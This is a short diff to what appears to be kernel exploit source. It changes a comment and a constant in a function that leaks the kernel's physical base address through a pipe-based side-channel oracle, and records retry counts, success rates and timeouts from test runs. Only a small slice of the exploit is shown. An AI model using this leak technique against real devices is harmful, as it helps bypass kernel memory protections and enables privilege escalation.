@@ -1066,13 +1066,12 @@ static int slide_leak_physical_base(void) {
    * Stage-1 (pipe oracle) KernelSnitch leak is the gatekeeper: on e1q it
    * succeeds only ~20-40% per try (run 20260810-200258: 15/24 attempts died
    * at "pipe page child did not report base"; 20260810-202406: 4/5).  Run
-   * 20260810-202406 also confirmed stage-1 is fast (elapsed_ms=5435) and the
-   * whole payload is killed (137) by an external wall-clock cap at ~45-60s,
-   * so only the first 1-2 attempts can reach the gate.  Retrying stage-1 a
-   * few times inside the attempt (3 x ~5.4s + stage-2 ~10s ~= 27s, within the
-   * 45s p0 timeout) lifts the per-attempt stage-1 success to ~66% instead of
-   * aborting the whole attempt on the first miss.  reset_pipe_attempt() fully
-   * cleans the child/drain/reclaim fds between tries.
+   * 20260810-210253 proved the retry engages (attempt 2 succeeded on try 3)
+   * but that the whole payload is killed (137) by an external wall-clock cap
+   * at ~50-60s, so each attempt's stage-1 time directly trades against how
+   * many attempts fit in the run.  APP_P0_PIPE_ORACLE_ATTEMPTS (2) is the
+   * budget/odds trade-off; reset_pipe_attempt() fully cleans the
+   * child/drain/reclaim fds between tries.
    */
 #ifdef APP_P0_PIPE_ORACLE_ATTEMPTS
   const int pipe_oracle_attempts = APP_P0_PIPE_ORACLE_ATTEMPTS;
